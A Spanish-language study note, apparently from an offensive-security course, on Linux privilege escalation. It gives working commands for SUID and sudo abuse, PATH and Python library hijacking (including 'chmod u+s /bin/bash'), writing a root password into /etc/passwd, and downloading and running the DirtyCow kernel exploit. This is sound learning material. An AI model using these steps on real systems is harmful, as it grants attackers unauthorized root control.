tags:
______
## Linux
### Tareas Cron
_________

Una tarea **cron** es una tarea programada en sistemas Unix/Linux que se ejecuta en un momento determinado o en intervalos regulares de tiempo. Estas tareas se definen en un archivo **crontab** que especifica qué comandos deben ejecutarse y cuándo deben ejecutarse.

Empezamos ejecutando el comando:

```bash
ps -aux
```

ó

```bash
ps -eo user,command
```

### SUID
_____
Un privilegio **SUID** (**Set User ID**) es un permiso especial que se puede establecer en un archivo binario en sistemas Unix/Linux. Este permiso le da al usuario que ejecuta el archivo los **mismos privilegios** que el **propietario** del archivo.

Por ejemplo, si un archivo binario tiene establecido el permiso SUID y es propiedad del usuario root, cualquier usuario que lo ejecute adquirirá temporalmente los mismos privilegios que el usuario root, lo que le permitirá realizar acciones que normalmente no podría hacer como un usuario normal.

Una manera rápida de comprobar esto, es ejecutando el siguiente comando en la máquina víctima:

```bash
find / -perm -4000 2>/dev/null
```

#### Parámetros del comando:
____

| find        | Cmando para realizar búsquedas a nivel de sistema                                                                                                           |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /           | Indica el directorio en el que se ejcutará la búsqueda. En este caso se indica el directorio raíz para que haga la búsqueda en todo el sistema              |
| -perm       | Con el parámetro perm indicamos que solo queremos buscar archivos que contengan un permiso específico                                                       |
| -4000       | 4000 es la forma de indicarle al comando que queremos buscar archivos con permiso SUID (equivalente al número 4)                                            |
| 2>/dev/null | Esto nos ayuda a redireccionar el stderr al /dev/null para no mostrar errores, como por ejemplo directorios o archivos donde no tenemos permisos de lectura |

De esta forma obtenemos algo así:

![[Pasted image 20251015070940.png]]

Una vez localizados los binarios con SUID, lo chequeamos en la página web de GTFOBins:

> https://gtfobins.github.io/

![[Anexos/Pasted image 20251013145321.png]]

Ya solo queda ejecutar el comando para convertirse en root.

### Sudoers
_____
Esta forma de escalar privilegios implica el abuso del permiso sudo para un binario concreto. Esto se comprueba en consola con el siguiente comando:

```bash
sudo -l
```

Esto nos arroja un posible resultado como el de la imagen:

![[Anexos/Pasted image 20251012145952.png]]

Al ver esto, vamos a ejecutar dicha ruta absoluta para ejecutar python, y además le añadiremos el parámetro -i para ejecutarlo en modo interactivo:
En este punto, con el siguiente one-liner logramos ejecución remota de comandos con privilegios:

```python
sudo -u root /usr/bin/python3 -i
```

![[Anexos/Pasted image 20251012151418.png]]

Ahora que sabemos que funciona, vamos a ejecutar la siguiente sentencia:

```python
import os; os.system("/bin/sh");
```

![[Anexos/Pasted image 20251012152619.png]]

### PATH Hijacking
____
**PATH Hijacking** es una técnica utilizada por los atacantes para **secuestrar** **comandos** de un sistema Unix/Linux mediante la manipulación del **PATH**. El PATH es una variable de entorno que define las rutas de búsqueda para los archivos ejecutables en el sistema.

La clave de esta técnica se trata de encontrar binarios en el sistema que se estén ejecutando como un usuario con más privilegios.
Cuando lo encontramos, lo que haremos es crear un archivo con el mismo nombre y con una instrucción maliciosa, por ejemplo **bash -p**.
Una vez hecho, exportamos la variable de entorno PATH de forma que el primer directorio en el que busque el binario sea el actual donde hemos creado la instrucción maliciosa. Digamos que el binario malicioso lo vamos a crear en nuestro escritorio:

```bash
export PATH=/home/vic/Escritorio/:$PATH
```

Ahora, si ejecutamos el binario malicioso con su ruta relativa, vamos a conseguir que el usuario privilegiado ejecute bash -p y nos devuelva una shell interactiva, habiendo escalado el privilegio al nuevo usuario, que no tiene que ser necesariamente root.

### Python Library Hijacking
____
Cuando hablamos de ‘**Python Library Hijacking**‘, a lo que nos referimos es a una técnica de ataque que aprovecha la forma en la que Python busca y carga bibliotecas para inyectar código malicioso en un script. El ataque se produce cuando un atacante crea o modifica una biblioteca en una ruta accesible por el script de Python, de tal manera que cuando el script la importa, se carga la versión maliciosa en lugar de la legítima.

Cuando detectamos que podemos ejecutar un archivo .py como otro usuario si usar contraseña, vamos a intentar leer el contenido del archivo para ver si podemos acceder a las librerías importadas. Cuando localizamos una, podemos potencialmente ejecutar un secuestro de librería:

El PATH de librerías de python lo podemos ver con el siguiente comando:

```python
python -c 'import sys; print(sys.path)'
```

![[Pasted image 20251015074716.png]]

> NOTA: Siempre intentaremos crear el archivo malicioso en una ruta que se encuentre en el PATH a la izquierda del directorio real donde se encuentra la librería original.

Por defecto, python intentará buscar la librería en nuestro directorio actual de trabajo antes de seguir por las siguientes rutas.
Entonces, si nosotros como atacante nos creamos un archivo .py con el nombre de la librería y una instrucción maliciosa, lograremos escalar privilegios:

Un comando que se puede usar para crear dicha librería falsa es el siguiente:

```python
echo 'import os; os.system("chmod u+s /bin/bash")' > librería.py
```

![[Anexos/Pasted image 20251015074212.png]]

### Abuso de permisos mal implementados
_____
El abuso de permisos incorrectamente implementados ocurre cuando los permisos de un archivo crítico son configurados incorrectamente, permitiendo a un usuario no autorizado acceder o modificar el archivo. Esto puede permitir a un atacante leer información confidencial, modificar archivos importantes, ejecutar comandos maliciosos o incluso obtener acceso de superusuario al sistema.

Por ejemplo, podemos buscar sobre qué archivos tengo capacidad de escritura para valorar un posible ataque:

```bash
find / -writable 2>/dev/null
```

Si, por ejemplo, vemos que podemos modificar el archivo **/etc/passwd**, podemos incluir una contraseña hardcodeada al usuario que queramos, usualmente root. Para conseguir el hash de la contraseña usaremos el comando openssl:

```bash
openssl passwd
```

Luego pegaremos la contraseña sustituyéndola por la "x" en el archivo **passwd** para que no la busque en el archivo **/etc/shadow**.

![[Pasted image 20251015081047.png]]

En este caso he puesto la contraseña **hola**.

Ahora, la pegamos en el archivo passwd:

![[Anexos/Pasted image 20251015081340.png]]

Ahora ya podemos acceder al usuario root con la contraseña hola.

### Explotación del kernel
_____
El **kernel** es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el kernel puede tener graves consecuencias para la seguridad del sistema.

En versiones antiguas del kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (**root**) en el sistema.

> NOTA: Se puede usar la herramienta Linux Exploit suggeester, que es una herramienta dedicada a determinar el mejor exploit para una versión del kernel dada. https://github.com/The-Z-Labs/linux-exploit-suggester.git

Chequeamos la versión del kernel:

![[Anexos/Pasted image 20251015155436.png]]



![[Anexos/Pasted image 20251015155718.png]]

```bash
searchsploit -m linux/local/40839.c
```

![[Anexos/Pasted image 20251015160002.png]]

Nos traemos el exploit a nuestro directorio actual de trabajo y  lo renombramos a dirtycow.c

Ahora nos montamos un servidor con python por el puerto 80 y descargamos el archivo desde la máquina vítima:

```bash
python3 -m http.server 80 
```

Ahora lo descargamos en la máquina victima con este comando:

```bash
wget 172.20.10.2/dirtycow.c
```

![[Anexos/Pasted image 20251015162007.png]]

Ahora vemos las instrucciones de instalación, con el comando:

```bash
cat dirtycow.c | grep gcc
```

![[Anexos/Pasted image 20251015164056.png]]

Ejecutamos la orden:

![[Anexos/Pasted image 20251015164730.png]]

Le seteamos la contraseña **hola**, y comprobamos el /etc/passwd:

![[Anexos/Pasted image 20251015164827.png]]

Nos cambiamos al usuario fairfart usando las siguientes credenciales:

```bash 
firefart:root
```

![[Anexos/Pasted image 20251015164948.png]]

Somos el usuario firefart en el grupo root!

> NOTA: El exploit nos crea también una backup:

![[Anexos/Pasted image 20251015165112.png]]


### Capabilities
_____
Rellenar con info del curso